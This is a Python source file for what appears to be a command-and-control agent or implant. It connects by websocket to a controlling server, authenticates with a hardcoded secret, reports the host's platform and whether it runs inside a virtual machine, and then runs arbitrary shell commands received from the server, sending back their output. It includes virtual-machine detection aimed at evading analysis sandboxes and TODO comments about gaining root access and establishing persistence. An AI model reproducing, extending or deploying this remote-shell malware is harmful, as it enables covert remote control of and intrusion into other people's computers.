import websockets
import asyncio
import json
import os
import traceback
import sys

debugMode = True


def debug(*args):
    if debugMode:
        print(*args)


"""{
  "uuid": "aee53005-c077-4f17-9566-fe699ff6a2e5",
  "secret": "$2b$12$/Pkioh0dFzRPmbD4LBMlg.xMwj2aGgpnHk0ntFRkRmNLC5plfSCnm",
  "name": "test_agent",
  "description": "agent for testing",
  "version": 0,
  "created_at": 1700229538,
  "last_seen": 1700229538,
  "raw_secret": "t8bGgAyPl8Pw7I6AJNopFKCl82TGo_M7bZZ1uouG1r8"
}"""


UUID = "aee53005-c077-4f17-9566-fe699ff6a2e5"

WS_URL = f"ws://127.0.0.1:8000/agent/{UUID}/ws"

# deepcode ignore HardcodedNonCryptoSecret: this is purely for testing
SECRET = "t8bGgAyPl8Pw7I6AJNopFKCl82TGo_M7bZZ1uouG1r8"

# TODO: gain root/administrator access

# TODO: establish persistence

# check if running in a VM
IS_VM = False

environment = [key for key in os.environ if 'VBOX' in key]
processes = [line.split()[0 if os.name == 'nt' else -1] for line in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if line.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
if len(environment) > 0 or len(processes) > 0:
    IS_VM = True


async def main():
    while True:
        try:
            async for ws in websockets.connect(WS_URL):
                # Send authentication
                await ws.send(json.dumps({
                    "secret": SECRET,
                    "platform": sys.platform,
                    "architecture": sys.maxsize > 2 ** 32 and "64bit" or "32bit",
                    "vm": IS_VM
                }))
                res = await ws.recv()
                res = json.loads(res)
                debug(res)
                if res.get("status") != '200':
                    raise Exception("Authentication failed")

                while True:
                    res = await ws.recv()
                    res = json.loads(res)
                    debug("recv: " + str(res))

                    if res.get("limitations") is not None:
                        if sys.platform in ['win32', 'darwin', 'linux', 'linux2']:
                            if sys.platform in res.get("limitations"):
                                await ws.send(json.dumps({
                                    "status": 403,
                                    "error": "Command not run because limitations are set"
                                }))
                                continue

                        if 'no-vm' in res.get("limitations"):
                            if IS_VM:
                                await ws.send(json.dumps({
                                    "status": 403,
                                    "error": "Command not run because limitations are set"
                                }))
                                continue

                    output = os.popen(res.get("command")).read()
                    debug(output)

                    await ws.send(json.dumps({
                        "status": 200,
                        "output": output
                    }))

        except Exception as e:
            debug(traceback.format_exc())
            await asyncio.sleep(5)

while True:
    asyncio.run(main())
